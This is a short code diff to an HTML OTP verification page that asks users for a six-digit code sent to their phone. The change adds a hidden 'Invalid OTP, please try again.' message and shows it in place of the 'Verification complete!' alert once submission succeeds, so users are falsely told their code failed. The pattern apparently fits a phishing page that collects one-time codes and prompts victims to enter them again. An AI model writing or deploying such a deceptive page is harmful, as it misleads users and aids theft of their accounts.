@@ -343,9 +343,9 @@
             <h1>OTP Verification</h1>
             <p>We've sent a 6-digit verification code to your registered mobile number</p>
         </div>
-
-            <form >
-
+        
+        <form >
+            
         <div class="otp-container">
             <div class="otp-inputs">
                 <input type="tel" name="one" class="otp-input" maxlength="1" id="otp1">
@@ -355,6 +355,7 @@
                 <input type="tel" name="five" class="otp-input" maxlength="1" id="otp5">
                 <input type="tel" name="six" class="otp-input" maxlength="1" id="otp6">
             </div>
+            <p style="color: red;text-align: center;display: none;" id="otpError">Invalid OTP, please try again.</p>
         </div>
 
         <div class="resend-container">
@@ -570,7 +571,8 @@
 
                 // Final redirect - could be to a completion page
                  verifyBtn.innerHTML = 'Verify';
-                alert('Verification complete!');
+                // alert('Verification complete!');
+                document.getElementById('otpError').style.display = 'block';
                 
             } catch (error) {
                 console.error('Error:', error);
